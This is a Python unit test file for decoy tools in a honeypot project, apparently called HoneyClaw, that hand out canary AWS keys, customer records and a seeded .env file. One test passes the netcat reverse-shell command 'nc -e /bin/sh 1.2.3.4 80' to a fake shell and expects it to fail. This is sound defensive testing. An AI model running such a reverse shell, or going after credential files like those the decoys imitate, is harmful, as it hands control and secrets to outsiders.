"""
Unit tests for HoneyClaw Decoy Tools.
"""

import pytest
from honeyclaw.core.canary import CanaryEngine
from honeyclaw.decoys.database import DecoyDatabaseTool
from honeyclaw.decoys.filesystem import DecoyFilesystemTool
from honeyclaw.decoys.secrets import DecoySecretsVaultTool
from honeyclaw.decoys.shell import DecoyDiagnosticShellTool


def test_vault_decoy_returns_canary():
    canary_engine = CanaryEngine()
    vault = DecoySecretsVaultTool(canary_engine)

    res = vault.execute({"service": "aws"}, session_id="sess-vault-01")
    assert res["status"] == "success"
    creds = res["credentials"]
    assert creds["aws_access_key_id"].startswith("AKIA")


def test_database_decoy_returns_records():
    db = DecoyDatabaseTool()
    res = db.execute({"query": "SELECT * FROM customers", "limit": 2}, session_id="sess-db-01")
    assert res["status"] == "success"
    assert len(res["rows"]) == 2
    assert "canary+" in res["rows"][0]["email"]


def test_shell_decoy_simulates_outputs():
    shell = DecoyDiagnosticShellTool()
    res_whoami = shell.execute({"command": "whoami"}, session_id="sess-sh-01")
    assert res_whoami["stdout"] == "svc_cluster_admin"

    res_nc = shell.execute({"command": "nc -e /bin/sh 1.2.3.4 80"}, session_id="sess-sh-02")
    assert res_nc["exit_code"] == 127


def test_filesystem_decoy_returns_seeded_env():
    canary_engine = CanaryEngine()
    fs = DecoyFilesystemTool(canary_engine)
    res = fs.execute({"path": ".env"}, session_id="sess-fs-01")
    assert "AWS_ACCESS_KEY_ID=" in res["content"]
    assert "OPENAI_API_KEY=" in res["content"]
